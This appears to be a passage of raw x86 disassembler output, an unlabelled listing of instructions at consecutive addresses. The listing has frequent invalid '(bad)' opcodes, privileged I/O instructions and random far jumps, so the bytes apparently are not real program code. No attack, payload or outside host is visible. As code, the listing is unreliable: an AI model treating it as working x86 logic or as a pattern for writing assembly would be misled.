  41ed16:	jae    0x41ed8a
  41ed18:	div    BYTE PTR [edx]
  41ed1a:	and    cl,bl
  41ed1c:	add    DWORD PTR [edi],ebx
  41ed1e:	xor    BYTE PTR [ecx-0x4e408cf5],bl
  41ed24:	mul    BYTE PTR [eax]
  41ed26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed27:	js     0x41ecc1
  41ed29:	jno    0x41ed2c
  41ed2b:	lds    ebp,FWORD PTR [esi+edi*1]
  41ed2e:	repnz inc ebp
  41ed30:	inc    ebx
  41ed31:	add    DWORD PTR [edi-0x42151f44],ebx
  41ed37:	cwde   
  41ed38:	mov    BYTE PTR [edx-0x54],dh
  41ed3b:	(bad)  
  41ed3d:	xor    bl,ch
  41ed3f:	(bad)  
  41ed41:	jmp    0x41ed21
  41ed43:	fucomp st(1)
  41ed45:	les    edi,FWORD PTR [ebx+0x30d4472f]
  41ed4b:	push   esi
  41ed4c:	inc    ebp
  41ed4d:	pusha  
  41ed4e:	add    ebp,DWORD PTR [edx+esi*4+0x4894d510]
  41ed55:	push   0x27dd724b
  41ed5a:	call   edx
  41ed5c:	and    DWORD PTR [esi],esp
  41ed5e:	popa   
  41ed5f:	adc    dh,BYTE PTR [esp+edx*1-0x33]
  41ed63:	int    0x56
  41ed65:	aad    0xc3
  41ed67:	loopne 0x41eced
  41ed69:	xchg   edx,eax
  41ed6a:	dec    DWORD PTR [ecx+0x3a]
  41ed6d:	test   DWORD PTR [ebx],ebp
  41ed6f:	jb     0x41ed8e
  41ed71:	ret    
  41ed72:	loope  0x41ed1e
  41ed74:	imul   esp,ecx,0x365f2b7a
  41ed7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed7b:	sti    
  41ed7c:	in     al,0x74
  41ed7e:	repz (bad) 
  41ed80:	pop    edi
  41ed81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed82:	or     eax,0x10906c63
  41ed87:	mov    ds:0x53d7f6b,al
  41ed8c:	mov    bh,0xb8
  41ed8e:	adc    al,0x80
  41ed90:	mov    bh,0x6a
  41ed92:	hlt    
  41ed93:	dec    ebp
  41ed94:	push   ecx
  41ed95:	inc    edx
  41ed96:	xchg   esi,eax
  41ed97:	call   0x7fe9d13e
  41ed9c:	fs clc 
  41ed9e:	mov    WORD PTR [esi-0x6c],ds
  41eda1:	icebp  
  41eda2:	out    dx,al
  41eda3:	mov    al,cs:0x29276c86
  41eda9:	(bad)  
  41edaa:	push   edx
  41edab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edac:	cmp    DWORD PTR [edi],ebp
  41edae:	in     al,0x4b
  41edb0:	xchg   edi,eax
  41edb1:	add    dl,ch
  41edb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb4:	xchg   esi,eax
  41edb5:	sbb    BYTE PTR [edx+0x60],dh
  41edb8:	mov    ds:0xabf30789,al
  41edbd:	push   esp
  41edbe:	lds    edx,FWORD PTR [ebx-0x75]
  41edc1:	not    BYTE PTR [edx]
  41edc3:	nop    edx
  41edc6:	jge    0x41ed50
  41edc8:	out    0x8a,eax
  41edca:	sahf   
  41edcb:	(bad)  [esi+0x77]
  41edce:	push   cs
  41edcf:	adc    ch,BYTE PTR [ebx]
  41edd1:	dec    esi
  41edd2:	ja     0x41ee4f
  41edd4:	les    ebx,FWORD PTR [esp+eax*2-0x50]
  41edd8:	push   ebp
  41edd9:	jbe    0x41ee02
  41eddb:	cld    
  41eddc:	inc    DWORD PTR [edi]
  41edde:	call   0xa5c6b4d7
  41ede3:	in     al,0xe8
  41ede5:	sbb    ebp,edx
  41ede7:	jns    0x41ee3d
  41ede9:	and    eax,0x316eebb9
  41edee:	xchg   ecx,eax
  41edef:	jae    0x41ede8
  41edf1:	dec    ecx
  41edf2:	mov    ds:0xb0a09274,al
  41edf7:	or     BYTE PTR [edx],bh
  41edf9:	pop    esp
  41edfa:	add    eax,0xa0d8e39d
  41edff:	xor    dh,BYTE PTR [edi]
  41ee01:	sbb    al,0x12
  41ee03:	lahf   
  41ee04:	xchg   ecx,eax
  41ee05:	cdq    
  41ee06:	sub    dh,BYTE PTR [ecx]
  41ee08:	inc    edx
  41ee0a:	push   ebx
  41ee0b:	out    0xa5,eax
  41ee0d:	in     eax,0x94
  41ee0f:	mov    eax,0xe595d9e
  41ee14:	and    BYTE PTR [edx+edx*4],ah
  41ee17:	inc    edi
  41ee18:	test   BYTE PTR ds:0x656f9916,dh
  41ee1e:	mul    BYTE PTR [edi+ebx*4+0x4a1bd423]
  41ee25:	cld    
  41ee26:	shr    eax,0x5f
  41ee29:	aam    0xc1
  41ee2b:	sti    
  41ee2c:	mov    DWORD PTR ds:0xf73c134,ecx
  41ee32:	mov    eax,0xc30b515a
  41ee37:	sahf   
  41ee38:	cmp    BYTE PTR [ebx+ecx*4],0x13
  41ee3c:	xchg   edi,eax
  41ee3d:	ret    
  41ee3e:	mov    ecx,DWORD PTR [edi-0x112f062b]
  41ee44:	mov    ebp,0x9b39a4f5
  41ee49:	das    
  41ee4a:	push   ecx
  41ee4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee4c:	fwait
  41ee4d:	je     0x41eddf
  41ee4f:	adc    ch,bh
  41ee51:	or     ebp,DWORD PTR [edi]
  41ee53:	mov    cl,0xe8
  41ee55:	sub    al,0x5
  41ee57:	pusha  
  41ee58:	retf   0x24d3
  41ee5b:	dec    esp
  41ee5c:	inc    eax
  41ee5d:	push   ebp
  41ee5e:	mov    al,0x1d
  41ee60:	jmp    0x69e55be8
  41ee65:	mov    edi,0x532b8e36
  41ee6a:	xchg   ebx,eax
  41ee6b:	or     al,0xe
  41ee6d:	xlat   BYTE PTR ds:[ebx]
  41ee6e:	push   ebx
  41ee6f:	pop    ds
  41ee70:	out    dx,eax
  41ee71:	xor    DWORD PTR [edi-0x3c9abd37],edx
  41ee77:	sbb    DWORD PTR [edx+0x24],ecx
  41ee7a:	add    ah,BYTE PTR [ebx]
  41ee7c:	sbb    bh,BYTE PTR [ebp+0x48]
  41ee7f:	in     al,0xe1
  41ee81:	aaa    
  41ee82:	xchg   BYTE PTR [edx+ebp*1+0x112b623c],bl
  41ee89:	sub    BYTE PTR ds:0x3c577f43,bl
  41ee8f:	inc    esp
  41ee90:	ja     0x41eef4
  41ee92:	fadd   DWORD PTR [esi-0x75]
  41ee95:	jp     0x41ef11
  41ee97:	sti    
  41ee98:	outs   dx,DWORD PTR ds:[esi]
  41ee99:	mov    edx,0x46d568f9
  41ee9e:	dec    esi
  41ee9f:	sub    BYTE PTR [ebx-0x36],ch
  41eea2:	xchg   edx,ecx
  41eea4:	cmp    ah,ah
  41eea6:	sbb    edx,DWORD PTR [ebx]
  41eea8:	clc    
  41eea9:	popf   
  41eeaa:	ret    0x109c
  41eead:	mov    ds:0xac4fe0f3,eax
  41eeb2:	mov    ebx,0xa9af5ab5
  41eeb7:	ja     0x41ee9f
  41eeb9:	jae    0x41eea8
  41eebb:	nop
  41eebc:	fimul  WORD PTR [edi+edx*2]
  41eebf:	xchg   eax,esp
  41eec1:	mov    dh,0xde
  41eec3:	(bad)  
  41eec4:	call   0x1847:0xe6bd451c
  41eecb:	inc    eax
  41eecc:	stos   DWORD PTR es:[edi],eax
  41eecd:	cdq    
  41eece:	test   eax,0xdfec28bb
  41eed3:	dec    eax
  41eed4:	adc    eax,0x4f9f6d5d
  41eed9:	push   edi
  41eeda:	stc    
  41eedb:	adc    al,0xa5
  41eedd:	retf   0x1d44
  41eee0:	cmp    al,ah
  41eee2:	out    0x8a,eax
  41eee4:	dec    ebx
  41eee5:	xor    DWORD PTR [ebx+0x70],ebx
  41eee8:	jb     0x41ef15
  41eeea:	or     BYTE PTR [eax+edi*2+0x4df5cb82],dh
  41eef1:	pop    edi
  41eef2:	mov    dl,0xbf
  41eef4:	loop   0x41ef75
  41eef6:	fld    QWORD PTR ds:0xc707b61c
  41eefc:	loop   0x41ef0a
  41eefe:	(bad)  
  41eeff:	pop    ebp
  41ef00:	lea    eax,[eax]
  41ef02:	call   0x4b9ddc54
  41ef07:	push   esi
  41ef08:	test   eax,0x76f47bbb
  41ef0d:	rcr    ecx,1
  41ef0f:	sbb    edi,eax
  41ef11:	xor    DWORD PTR [eax+0x7c0cbbc8],esi
  41ef17:	shr    DWORD PTR [edx],1
  41ef19:	addr16 xor ah,ch
  41ef1c:	test   BYTE PTR cs:0x256cdb3e,bl
  41ef23:	mov    dl,0xc5
  41ef25:	dec    BYTE PTR [edx]
  41ef27:	rcr    ebx,cl
  41ef29:	lea    edx,[edx+0x25850136]
  41ef2f:	(bad)  
  41ef30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef31:	or     eax,0x5646f8e8
  41ef36:	bound  ebx,QWORD PTR [esi-0x50]
  41ef39:	popa   
  41ef3a:	jno    0x41ef40
  41ef3c:	jle    0x41ef64
  41ef3e:	inc    esi
  41ef3f:	test   al,0x15
  41ef41:	cs repz inc edx
  41ef44:	iret   
  41ef45:	cmp    dl,bh
  41ef47:	cli    
  41ef48:	inc    ecx
  41ef49:	out    dx,al
  41ef4a:	mov    al,0xcd
  41ef4c:	out    dx,eax
  41ef4d:	pop    eax
  41ef4e:	ins    DWORD PTR es:[edi],dx
  41ef4f:	push   es
  41ef50:	cmp    BYTE PTR [edx],cl
  41ef52:	lock cmc 
  41ef54:	in     al,0xf7
  41ef56:	jno    0x41ef58
  41ef58:	sahf   
  41ef59:	in     eax,dx
  41ef5a:	push   0xd9b5be82
  41ef5f:	inc    ebx
  41ef60:	xchg   edi,eax
  41ef61:	stos   DWORD PTR es:[edi],eax
  41ef62:	repz sbb al,BYTE PTR [ecx-0x76]
  41ef66:	mov    bl,0xe7
  41ef68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef69:	xor    esp,ebx
  41ef6b:	cmovge ecx,esp
  41ef6e:	sahf   
  41ef6f:	pop    ebp
  41ef70:	jl     0x41ef9a
  41ef72:	push   esp
  41ef73:	loop   0x41efc0
  41ef75:	and    BYTE PTR [ecx],0x72
  41ef78:	and    ebx,DWORD PTR [ecx+0x2d3b1509]
  41ef7e:	ss sbb eax,0x19d0aa3e
  41ef84:	xchg   ebp,eax
  41ef85:	add    eax,0x2a7b4262
  41ef8a:	pop    esi
  41ef8b:	addr16 popf 
  41ef8d:	nop
  41ef8e:	scas   eax,DWORD PTR es:[edi]
  41ef8f:	add    ah,dl
  41ef91:	dec    esp
  41ef92:	jno    0x41ef99
  41ef94:	sbb    edx,DWORD PTR [esi+0x647872c8]
  41ef9a:	imul   eax,DWORD PTR [eax-0x1407d467],0x9a6adb04
  41efa4:	ja     0x41ef5b
  41efa6:	mov    ah,0xbd
  41efa8:	xor    al,0xe2
  41efaa:	ins    DWORD PTR es:[edi],dx
  41efab:	out    0xc9,al
  41efad:	push   es
  41efae:	bound  ecx,QWORD PTR [esi+0x2c]
  41efb1:	call   0x5863:0x205f9618
  41efb8:	xchg   ecx,eax
  41efb9:	mov    esp,0xb4c14008
  41efbe:	jbe    0x41f00a
  41efc0:	loope  0x41efe9
  41efc2:	mov    esp,0x1bb7886
  41efc7:	mov    esp,0x91e4b4e
  41efcc:	push   ecx
  41efcd:	test   al,0xdb
  41efcf:	(bad)  
  41efd3:	pop    es
  41efd4:	stos   DWORD PTR es:[edi],eax
  41efd5:	or     DWORD PTR [ebx],ecx
  41efd7:	push   edx
  41efd8:	sub    ebx,DWORD PTR [edx-0x52]
  41efdb:	iret   
  41efdc:	sbb    DWORD PTR [edx+0x17],eax
  41efdf:	pop    ebp
  41efe0:	popa   
  41efe1:	mov    bh,0x2e
  41efe3:	call   0x5b5d:0x4e4f8163
  41efea:	push   cs
  41efeb:	imul   ebx,DWORD PTR [esi*2-0x494ed59d],0xdba9c4b5
  41eff6:	ror    ah,cl
  41eff8:	pop    ds
  41eff9:	adc    al,0x8b
  41effb:	fadd   QWORD PTR [ecx-0x33bcd241]
  41f001:	push   ecx
  41f002:	push   esp
  41f003:	bound  ecx,QWORD PTR [ecx-0x2a75b7fe]
  41f009:	in     eax,0xe8
  41f00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f00c:	pop    DWORD PTR [eax]
  41f00e:	pop    ss
  41f00f:	sar    esp,0x9e
  41f012:	fdivr  QWORD PTR [ebp-0x3f]
  41f015:	mov    al,ds:0x3c2299db
  41f01a:	push   eax
  41f01b:	mov    esp,DWORD PTR [edx+0x1bcd9c6e]
  41f021:	push   es
  41f022:	pop    ds
  41f023:	stos   DWORD PTR es:[edi],eax
  41f024:	sub    bl,BYTE PTR [ecx+0x64]
  41f027:	sub    esp,DWORD PTR [esp+ebx*4]
  41f02a:	jno    0x41f0a1
  41f02c:	cmc    
  41f02d:	outs   dx,DWORD PTR ds:[esi]
  41f02e:	jmp    0x41f09b
  41f030:	ja     0x41f071
  41f032:	stos   DWORD PTR es:[edi],eax
  41f033:	test   DWORD PTR ds:[ecx+0x1333fba5],ebp
  41f03a:	add    BYTE PTR [edx],bh
  41f03c:	sub    DWORD PTR [ebx+ebp*4-0x31],esp
  41f040:	mov    bh,0xd9
  41f042:	dec    esp
  41f043:	rdmsr  
  41f045:	mov    edx,eax
  41f047:	pusha  
  41f048:	push   ebx
  41f049:	enter  0x9c06,0xf1
  41f04d:	cmp    al,0xbd
  41f04f:	jmp    0x8644:0x627bc204
  41f056:	add    bl,dl
  41f058:	or     ebp,ebp
  41f05a:	or     eax,0xd91b2ac7
  41f05f:	call   0xd31e586c
  41f064:	aam    0x48
  41f066:	and    eax,0x198c2409
  41f06b:	js     0x41f02d
  41f06d:	xchg   ebp,eax
  41f06e:	test   al,0xcd
  41f070:	sbb    al,0x46
  41f072:	push   esp
  41f073:	icebp  
  41f074:	xor    BYTE PTR [esi-0x55a0cb29],dh
  41f07a:	stc    
  41f07b:	jl     0x41f0cf
  41f07d:	mov    ds:0x70ab3b83,al
  41f082:	lock cmp ch,ch
  41f085:	sub    bl,BYTE PTR [ebp-0x17ad7b85]
  41f08b:	leave  
  41f08c:	rcl    DWORD PTR [ecx],cl
  41f08e:	dec    ebp
  41f08f:	pop    edx
  41f090:	popf   
  41f091:	pop    ds
  41f092:	adc    bl,dh
  41f094:	sub    edx,esp
  41f096:	fisttp DWORD PTR [esp+ecx*1-0x7cd3510a]
  41f09d:	dec    eax
  41f09e:	mov    esp,DWORD PTR [eax+ebp*2]
  41f0a1:	not    al
  41f0a3:	mov    cl,0x47
  41f0a5:	add    DWORD PTR [esi+0x2ace2b14],ebx
  41f0ab:	(bad)  
  41f0ac:	cdq    
  41f0ad:	add    BYTE PTR [edi+edi*4],dh
  41f0b0:	sti    
  41f0b1:	push   eax
  41f0b2:	dec    ebx
  41f0b3:	lock repnz add eax,0x22c16268
  41f0ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0bb:	pop    ds
  41f0bc:	js     0x41f072
  41f0be:	xchg   ebx,eax
  41f0bf:	lods   eax,DWORD PTR ds:[esi]
  41f0c0:	data16 loopne 0x41f050
  41f0c3:	xor    bh,ch
  41f0c5:	xchg   ecx,eax
  41f0c6:	call   0x5a22:0xa3c857fb
  41f0cd:	mov    bh,0x6b
  41f0cf:	into   
  41f0d0:	sbb    eax,0x36620967
  41f0d5:	xlat   BYTE PTR fs:[ebx]
  41f0d7:	xor    DWORD PTR [ecx-0x64],esi
  41f0da:	mov    DWORD PTR [esi+0x37aeb77f],edx
  41f0e0:	mov    ds:0xf9dc8821,al
  41f0e5:	jns    0x41f15b
  41f0e7:	inc    esp
  41f0e8:	jo     0x41f0f1
  41f0ea:	leave  
  41f0eb:	and    bh,BYTE PTR [edi]
  41f0ed:	test   BYTE PTR [edi+0x3f4bc1ea],bl
  41f0f3:	hlt    
  41f0f4:	add    eax,0xaa4a578
  41f0f9:	jmp    0xdcbf:0xfbc4a13a
  41f100:	dec    cl
  41f102:	(bad)  
  41f103:	sti    
  41f104:	sbb    ah,dl
  41f106:	mov    edi,0x7a107f84
  41f10b:	and    al,al
  41f10d:	mov    ebx,0x13405e9a
  41f112:	mov    ch,0xa5
  41f114:	xchg   esp,eax
  41f115:	sub    DWORD PTR ss:[ecx+0x76],edi
  41f119:	leave  
  41f11a:	outs   dx,BYTE PTR ds:[esi]
  41f11b:	mov    esp,0x21bf21bb
  41f120:	dec    esi
  41f121:	inc    ecx
  41f122:	je     0x41f0ec
  41f124:	or     ah,dh
  41f126:	aas    
  41f127:	inc    esi
  41f128:	sbb    BYTE PTR ds:[ebx-0x78],0x37
  41f12d:	push   ss
  41f12e:	adc    ah,BYTE PTR [edi-0x25f6a021]
  41f134:	mov    ch,0xc7
  41f136:	mov    ecx,DWORD PTR [esi]
  41f138:	ror    DWORD PTR [eax],1
  41f13a:	in     eax,dx
  41f13b:	addr16 sbb eax,0xc106d75d
  41f141:	inc    esi
  41f142:	test   al,0x66
  41f144:	pop    esp
  41f145:	sub    al,0x8c
  41f147:	or     eax,0x718536ba
  41f14c:	inc    ebx
  41f14d:	jmp    0x41f0ff
  41f14f:	bound  eax,QWORD PTR [eax]
  41f151:	mov    dh,BYTE PTR [ebx+0xc90497b]
  41f157:	aaa    
  41f158:	mov    dh,0x6
  41f15a:	(bad)  
  41f15b:	or     al,0x2a
  41f15d:	fnstcw WORD PTR [eax]
  41f15f:	inc    edi
  41f160:	jl     0x41f18a
  41f162:	push   ebp
  41f163:	sar    BYTE PTR [esi],0x17
  41f166:	or     al,0x75
  41f168:	fnstenv [edx]
  41f16a:	adc    DWORD PTR [eax-0x568f0ede],edx
  41f170:	not    DWORD PTR [esi+0x5e]
  41f173:	jg     0x41f169
  41f175:	icebp  
  41f176:	pop    edx
  41f177:	fcomip st,st(3)
  41f179:	push   esp
  41f17a:	inc    edi
  41f17b:	push   0x5cb0210a
  41f180:	or     eax,0x8e65950b
  41f185:	out    dx,eax
  41f186:	out    dx,eax
  41f187:	push   esp
  41f188:	div    edx
  41f18a:	or     al,0x98
  41f18c:	loopne 0x41f11a
  41f18e:	mov    bl,0xc6
  41f190:	mov    ebp,0x510da68c
  41f195:	sti    
  41f196:	push   ebp
  41f197:	dec    DWORD PTR [esi-0xe]
  41f19a:	pusha  
  41f19b:	jns    0x41f1a7
  41f19d:	and    eax,0x490064a9
  41f1a2:	xchg   esp,eax
  41f1a3:	sbb    esi,DWORD PTR [esi-0x1ed3961f]
  41f1a9:	push   ecx
  41f1aa:	call   0x9ab1:0x8ad5d11c
  41f1b1:	jmp    0x41f211
  41f1b3:	fdivr  QWORD PTR [esi+0x1893514e]
  41f1b9:	inc    eax
  41f1ba:	aas    
  41f1bb:	lahf   
  41f1bc:	fist   WORD PTR [ebp+0x1cb3cf1]
  41f1c2:	les    edi,FWORD PTR [edi-0x39]
  41f1c5:	pop    edx
  41f1c6:	pop    edx
  41f1c7:	adc    bh,cl
  41f1c9:	and    BYTE PTR [ebp+edx*8+0x26],0x62
  41f1ce:	je     0x41f1e4
  41f1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1d1:	das    
  41f1d2:	leave  
  41f1d3:	fs ins BYTE PTR es:[edi],dx
  41f1d5:	std    
  41f1d6:	inc    ebp
  41f1d7:	jmp    0x1659:0x945b2503
  41f1de:	inc    esp
  41f1df:	fsubr  DWORD PTR [edi-0x7d]
  41f1e2:	daa    
  41f1e3:	pushf  
  41f1e4:	pop    ebp
  41f1e5:	mov    eax,0xdc6f95b3
  41f1ea:	in     al,0x5c
  41f1ec:	push   es
  41f1ed:	sahf   
  41f1ee:	std    
  41f1ef:	inc    edi
  41f1f0:	push   edx
  41f1f1:	sub    ecx,DWORD PTR [ecx]
  41f1f3:	fwait
  41f1f4:	pop    ecx
  41f1f5:	push   ebx
  41f1f6:	xlat   BYTE PTR ds:[ebx]
  41f1f7:	and    al,0x3
  41f1f9:	sbb    ebx,edx
  41f1fb:	xchg   esi,eax
  41f1fc:	mov    edx,0x87e6d231
  41f201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f202:	jmp    0x1d090f09
  41f207:	iret   
  41f208:	(bad)  
  41f209:	leave  
  41f20a:	ret    0xf9cc
  41f20d:	scas   al,BYTE PTR es:[edi]
  41f20e:	jbe    0x41f23e
  41f210:	imul   ebp,ecx,0x87c2cfe8
  41f216:	mov    ebx,edx
  41f218:	aad    0x4c
  41f21a:	adc    esi,DWORD PTR [edi+esi*2]
  41f21d:	pop    edi
  41f21e:	dec    ebx
  41f21f:	push   eax
  41f220:	add    ebp,ebp
  41f222:	lahf   
  41f223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f224:	in     eax,dx
  41f225:	sbb    eax,0x78523d23
  41f22a:	cmp    BYTE PTR [ecx-0x6d],dl
  41f22d:	jne    0x41f23c
  41f22f:	pop    ss
  41f230:	(bad)  
  41f231:	push   ebp
  41f232:	jmp    0xcc6e4a4
  41f237:	rcr    esi,cl
  41f239:	inc    bp
  41f23b:	test   BYTE PTR [ebx],dl
  41f23d:	or     eax,0x451a74ba
  41f242:	aam    0xb3
  41f244:	pop    ebp
  41f245:	push   edx
  41f246:	lahf   
  41f247:	jno    0x41f1d8
  41f249:	fwait
  41f24a:	adc    bl,BYTE PTR [esi-0x4e]
  41f24d:	out    0x17,eax
  41f24f:	rcr    DWORD PTR [eax+ecx*4+0x7d],cl
  41f253:	dec    edx
  41f254:	aam    0x19
  41f256:	out    0xf8,al
  41f258:	xchg   BYTE PTR [ebp+0x50],ch
  41f25b:	and    dl,BYTE PTR ss:[eax-0x56]
  41f25f:	std    
  41f260:	pop    edx
  41f261:	push   ebp
  41f262:	cwde   
  41f263:	and    edx,ebx
  41f265:	aas    
  41f266:	and    al,0x10
  41f268:	ror    bh,1
  41f26a:	push   ebx
  41f26b:	fdivp  st(4),st
  41f26d:	add    DWORD PTR [eax-0x4a],esp
  41f270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f271:	cmp    edx,esi
  41f273:	lock enter 0xc7bc,0x12
  41f278:	js     0x41f2e5
  41f27a:	fnstenv [ebp+0x597c5172]
  41f280:	push   ecx
  41f281:	or     cl,ah
  41f283:	loop   0x41f20a
  41f285:	push   eax
  41f286:	pop    ss
  41f287:	cdq    
  41f288:	adc    DWORD PTR [eax-0x25],esp
  41f28b:	shl    BYTE PTR [edi+0x55b8a4ba],0x28
  41f292:	cmp    edx,DWORD PTR [edx+0x4dadf1cd]
  41f298:	xor    al,0x77
  41f29a:	cmp    eax,0x99d9cb3c
  41f29f:	inc    eax
  41f2a0:	je     0x41f25d
  41f2a2:	ss jle 0x41f268
  41f2a5:	inc    esi
  41f2a6:	sbb    dh,BYTE PTR [edx-0x5c279560]
  41f2ac:	dec    ebp
  41f2ad:	(bad)  [ebx]
  41f2af:	push   ss
  41f2b0:	or     ebp,eax
  41f2b2:	enter  0x8f56,0xfe
  41f2b6:	adc    al,0x82
  41f2b8:	jmp    0x94b6:0xacedc654
  41f2bf:	adc    edi,ebp
  41f2c1:	in     al,dx
  41f2c2:	shl    BYTE PTR [esi+0x2ce5b492],1
  41f2c8:	popa   
  41f2c9:	mov    ds:0x600164fd,eax
  41f2ce:	(bad)  
  41f2cf:	sub    DWORD PTR [ecx+0x1a],ebx
  41f2d2:	push   edi
  41f2d3:	sbb    edx,DWORD PTR [esi-0x2bce5e3d]
  41f2d9:	repnz es leave 
  41f2dc:	cmc    
  41f2dd:	mov    al,al
  41f2df:	aas    
  41f2e0:	mov    dl,0x15
  41f2e2:	jge    0x41f2b9
  41f2e4:	dec    edx
  41f2e5:	mov    bl,0x81
  41f2e7:	(bad)  
  41f2e8:	push   esp
  41f2e9:	pop    esi
  41f2ea:	pop    ebx
  41f2eb:	mov    bh,0x30
  41f2ed:	(bad)  
  41f2ee:	leave  
  41f2ef:	push   0x16e331a5
  41f2f4:	and    al,0x65
  41f2f6:	xchg   ecx,eax
  41f2f7:	jae    0x41f2e8
  41f2f9:	loope  0x41f311
  41f2fb:	jbe    0x41f2af
  41f2fd:	add    DWORD PTR [edx-0x2a18cc6a],edi
  41f303:	loop   0x41f30a
  41f305:	shl    BYTE PTR [ecx+0x61618148],0x83
  41f30c:	mov    ds:0x2458eea5,eax
  41f311:	xor    BYTE PTR [esi+0x71f01ce8],0x5d
  41f318:	enter  0xf343,0x16
  41f31c:	fwait
  41f31d:	dec    ebx
  41f31e:	mov    ebp,0xc56eeb75
  41f323:	or     al,0xae
  41f325:	leave  
  41f326:	mov    ch,0x6d
  41f328:	in     eax,0x68
  41f32a:	or     al,0x52
  41f32c:	das    
  41f32d:	and    cl,cl
  41f32f:	adc    ebx,DWORD PTR [ebp+0x39]
  41f332:	lods   eax,DWORD PTR ds:[esi]
  41f333:	pushf  
  41f334:	es dec ebx
  41f336:	test   BYTE PTR [edi],dh
  41f338:	je     0x41f350
  41f33a:	mov    WORD PTR [edi+0x491245be],ss
  41f340:	shl    ecx,0x8e
  41f343:	gs pop ebx
  41f345:	aad    0xa3
  41f347:	xlat   BYTE PTR ds:[ebx]
  41f348:	pusha  
  41f349:	and    al,bh
  41f34b:	jns    0x41f32d
  41f34d:	cwde   
  41f34e:	sbb    al,0x63
  41f350:	xchg   ebx,eax
  41f351:	push   esp
  41f352:	popa   
  41f353:	cmc    
  41f354:	out    dx,al
  41f355:	cmp    cl,BYTE PTR [ebp-0xe]
  41f358:	jae    0x41f2dc
  41f35a:	jno    0x41f3a3
  41f35c:	out    dx,al
  41f35d:	jp     0x41f3bb
  41f35f:	repz inc esi
  41f361:	ror    dh,0x80
  41f364:	push   edi
  41f365:	fbstp  TBYTE PTR [ecx+0x32]
  41f368:	and    eax,0xcbad3ef1
  41f36d:	push   esp
  41f36e:	int3   
  41f36f:	add    eax,0x851d9077
  41f374:	mov    al,ds:0x45084af0
  41f379:	mov    ch,BYTE PTR [esi]
  41f37b:	push   ss
  41f37c:	jle    0x41f374
  41f37e:	push   ss
  41f37f:	das    
  41f380:	retf   
  41f381:	fild   QWORD PTR [ebp-0x7bd12482]
  41f387:	xchg   DWORD PTR [edi-0x59],ebx
  41f38a:	in     al,dx
  41f38b:	lods   eax,DWORD PTR ds:[esi]
  41f38c:	sub    BYTE PTR ds:0x95463e67,0x69
  41f393:	jecxz  0x41f3c4
  41f395:	sbb    BYTE PTR [eax-0x6c],al
  41f398:	repz (bad) 
  41f39a:	popf   
  41f39b:	outs   dx,DWORD PTR ds:[esi]
  41f39c:	inc    edi
  41f39d:	mov    edx,0x76f83026
  41f3a2:	dec    eax
  41f3a3:	xchg   ecx,eax
  41f3a4:	jmp    0xe23b:0x932db69b
  41f3ab:	fwait
  41f3ac:	cmp    ecx,0xffffff89
  41f3af:	cwde   
  41f3b0:	push   ebp
  41f3b1:	push   es
  41f3b2:	sbb    eax,0xbe340eac
  41f3b7:	ret    0xf874
  41f3ba:	into   
  41f3bb:	(bad)  
  41f3bc:	ins    BYTE PTR es:[edi],dx
  41f3bd:	dec    eax
  41f3be:	cdq    
  41f3bf:	fcomp  DWORD PTR [ecx-0x6e]
  41f3c2:	(bad)  
  41f3c3:	popa   
  41f3c4:	inc    edx
  41f3c5:	nop    DWORD PTR [ebx+0x5a]
  41f3c9:	leave  
  41f3ca:	stos   DWORD PTR es:[edi],eax
  41f3cb:	(bad)  
  41f3cc:	fdivr  QWORD PTR [edx+0x2b]
  41f3cf:	mov    ebp,0xd56bc25d
  41f3d4:	cmp    al,BYTE PTR [eax]
  41f3d6:	mov    esi,0xc6c1e169
  41f3db:	pusha  
  41f3dc:	jp     0x41f414
  41f3de:	jnp    0x41f3da
  41f3e0:	cwde   
  41f3e1:	pop    ecx
  41f3e2:	sbb    al,0x3a
  41f3e4:	popa   
  41f3e5:	mov    al,0x52
  41f3e7:	enter  0x128f,0x1d
  41f3eb:	push   eax
  41f3ec:	sub    al,0xce
  41f3ee:	or     DWORD PTR [edi-0x13005204],ebp
  41f3f4:	push   ebx
  41f3f5:	mov    ss,WORD PTR [ebx]
  41f3f7:	sahf   
  41f3f8:	les    eax,FWORD PTR [edx]
  41f3fa:	pop    edx
  41f3fb:	scas   al,BYTE PTR es:[edi]
  41f3fc:	dec    esi
  41f3fd:	das    
  41f3fe:	mov    cl,0xc8
  41f400:	bts    DWORD PTR [esi-0x80],0xec
  41f405:	push   esi
  41f406:	cs xchg edx,eax
  41f408:	cwde   
  41f409:	call   0x1141:0x4f094c29
  41f410:	ret    0x2a5a
  41f413:	repz mov dl,0x3
  41f416:	inc    esp
  41f417:	mov    ch,0xb8
  41f419:	xchg   edi,eax
  41f41a:	pop    esi
  41f41b:	push   esi
  41f41c:	jne    0x41f40f
  41f41e:	(bad)  
  41f41f:	jo     0x41f420
  41f421:	inc    esp
  41f422:	loopne 0x41f475
  41f424:	xor    esp,eax
  41f426:	pop    ebp
  41f427:	jl     0x41f3ad
  41f429:	cmp    DWORD PTR [edx],edx
  41f42b:	jne    0x41f41b
  41f42d:	fstp   QWORD PTR [ebx]
  41f42f:	dec    ecx
  41f430:	sbb    ah,al
  41f432:	in     al,dx
  41f433:	fcomp  QWORD PTR [eax-0x38]
  41f436:	push   eax
  41f437:	test   DWORD PTR [edi+0x5],ecx
  41f43a:	inc    esi
  41f43b:	jns    0x41f3d5
  41f43d:	sub    DWORD PTR [edx+edx*8+0x6f5215a5],esi
  41f444:	mov    esp,0xb54f9f6f
  41f449:	mov    eax,ds:0xd436932a
  41f44e:	sub    DWORD PTR [esi+0x201bccf5],ebp
  41f454:	(bad)  
  41f455:	repnz into 
  41f457:	out    0x78,al
  41f459:	out    dx,eax
  41f45a:	sub    DWORD PTR [eax+0x3c],esi
  41f45d:	dec    ebx
